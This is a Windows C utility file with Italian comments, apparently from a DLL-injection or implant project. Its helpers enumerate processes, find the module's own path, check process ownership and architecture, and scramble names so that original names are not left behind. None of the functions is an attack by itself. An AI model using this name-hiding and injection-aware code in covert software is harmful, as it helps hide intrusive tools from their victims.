#include <windows.h>
#include <psapi.h>
#include <Tlhelp32.h>
#include "Common.h"

// Torna true se siamo nell processo proc_name
BOOL AmIThis(WCHAR *proc_name)
{
	WCHAR my_path[MAX_PATH];
	WCHAR *my_name;

	ZeroMemory(my_path, sizeof(my_path));
	GetModuleFileNameW(NULL, my_path, sizeof(my_path)-1);
	my_name = wcsrchr(my_path, '\\');

	if (my_name) {
		my_name++;
		if (!wcsicmp(my_name, proc_name))
			return TRUE;
	}
	return FALSE;
}

// Trova il path completo della DLL. path_size e' in byte
BOOL FindModulePath(WCHAR *path_buf, DWORD path_size)
{
	HMODULE h_lib = NULL;
	HMODULE modules[1024];
	DWORD mod_size;
	DWORD mod_num;
	DWORD i;

	if (!EnumProcessModules(GetCurrentProcess(), modules, sizeof(modules), &mod_size)) 
		return FALSE;

	mod_num = mod_size/sizeof(HMODULE);
	for (i=0; i<mod_num; i++) 
		if (GetProcAddress(modules[i], EXPORTED_FUNC))
			h_lib = modules[i];

	if (!h_lib) 
		return FALSE;
	
	ZeroMemory(path_buf, path_size);
	if (!GetModuleFileNameExW(GetCurrentProcess(), h_lib, path_buf, path_size/sizeof(WCHAR))) 
		return FALSE;

	return TRUE;
}

// Dato un pid torna il nome del processo (NULL se non lo trova)
// Il valore di ritorno va liberato.
WCHAR *FindProc(DWORD pid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32W pe32;
	DWORD dwPID = 0;
	WCHAR *name_offs;
	WCHAR *ret_name = NULL;

	pe32.dwSize = sizeof( PROCESSENTRY32W );
	if ( (hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return NULL;

	if( !Process32FirstW( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return NULL;
	}

	// Cicla la lista dei processi attivi
	do {
		// Cerca il processo "pid"
		if (pe32.th32ProcessID == pid) {
			// Elimina il path
			name_offs = wcsrchr(pe32.szExeFile, L'\\');
			if (!name_offs)
				name_offs = pe32.szExeFile;
			else
				name_offs++;
			ret_name = _wcsdup(name_offs);
			break;
		}
	} while( Process32NextW( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return ret_name;
}

// Cosa fara' mai?
DWORD GetParentPid(DWORD chpid)
{
	HANDLE hProcessSnap;
	PROCESSENTRY32W pe32;
	DWORD dwPID = 0;

	pe32.dwSize = sizeof( PROCESSENTRY32W );
	if ( (hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 )) == INVALID_HANDLE_VALUE )
		return 0;

	if( !Process32FirstW( hProcessSnap, &pe32 ) ) {
		CloseHandle( hProcessSnap );
		return 0;
	}

	// Cicla la lista dei processi attivi
	do {
		if (chpid == pe32.th32ProcessID) {
			dwPID = pe32.th32ParentProcessID;
			break;
		}
	} while( Process32NextW( hProcessSnap, &pe32 ) );

	CloseHandle( hProcessSnap );
	return dwPID;
}


// Effettua lo scrambling e il descrimbling di una stringa
// Ricordarsi di liberare la memoria allocata
// E' Thread SAFE
#define ALPHABET_LEN 64
WCHAR *ScrambleName(WCHAR *string, BYTE scramble, BOOL crypt)
{
	WCHAR alphabet[ALPHABET_LEN]={L'_',L'B',L'q',L'w',L'H',L'a',L'F',L'8',L'T',L'k',L'K',L'D',L'M',
		                          L'f',L'O',L'z',L'Q',L'A',L'S',L'x',L'4',L'V',L'u',L'X',L'd',L'Z',
		                          L'i',L'b',L'U',L'I',L'e',L'y',L'l',L'J',L'W',L'h',L'j',L'0',L'm',
                                  L'5',L'o',L'2',L'E',L'r',L'L',L't',L'6',L'v',L'G',L'R',L'N',L'9',
					              L's',L'Y',L'1',L'n',L'3',L'P',L'p',L'c',L'7',L'g',L'-',L'C'};                  
	WCHAR *ret_string;
	DWORD i,j;

	if ( !(ret_string = _wcsdup(string)) )
		return NULL;

	// Evita di lasciare i nomi originali anche se il byte e' 0
	scramble%=ALPHABET_LEN;
	if (scramble == 0)
		scramble = 1;

	for (i=0; ret_string[i]; i++) {
		for (j=0; j<ALPHABET_LEN; j++)
			if (ret_string[i] == alphabet[j]) {
				// Se crypt e' TRUE cifra, altrimenti decifra
				if (crypt)
					ret_string[i] = alphabet[(j+scramble)%ALPHABET_LEN];
				else
					ret_string[i] = alphabet[(j+ALPHABET_LEN-scramble)%ALPHABET_LEN];
				break;
			}
	}
	return ret_string;
}

BOOL IsX64Process(DWORD pid)
{
	static IsWow64Process_t pIsWow64Process = NULL;
	HANDLE hProc;
	BOOL is_target_32 = TRUE;

	if (!pIsWow64Process)
		pIsWow64Process = (IsWow64Process_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "IsWow64Process");
	if (!pIsWow64Process)
		return FALSE;

	if (! (hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid)) )
		return FALSE;

	if (!pIsWow64Process(hProc, &is_target_32)) {
		CloseHandle(hProc);
		return FALSE;
	}

	CloseHandle(hProc);
	return !is_target_32;
}

// Torna TRUE se il processo e' dell'utente
// chiamante
BOOL IsMyProcess(DWORD pid)
{
	HANDLE hProc=0;
	HANDLE hToken=0;
	TOKEN_USER *token_owner=NULL;
	char wsRefDomain[512], wsUserName[512], wsEffectiveName[512];
	SID_NAME_USE peUse;
	BOOL ret_val = FALSE;
	DWORD dwLen=0, cbUserName = sizeof(wsUserName), cbRefDomain = sizeof(wsRefDomain), cbEffectiveName = sizeof(wsEffectiveName);

	hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

	if (hProc) {
		if( OpenProcessToken(hProc, TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken) ) {
			GetTokenInformation(hToken, TokenUser, token_owner, 0, &dwLen);
			if (dwLen)
				token_owner = (TOKEN_USER *) malloc( dwLen );
			if(token_owner) {
				memset(token_owner, 0, dwLen);
				if(GetTokenInformation(hToken, TokenUser, token_owner, dwLen, &dwLen) )
					if (LookupAccountSidA(NULL, token_owner->User.Sid, wsUserName, &cbUserName, wsRefDomain, &cbRefDomain, &peUse)) 
						if (GetUserNameA(wsEffectiveName, &cbEffectiveName))
							if (!_stricmp(wsEffectiveName, wsUserName))
								ret_val = TRUE;
				free(token_owner);
			}
			CloseHandle(hToken);
		}
		CloseHandle(hProc);
	}

	return ret_val;
}
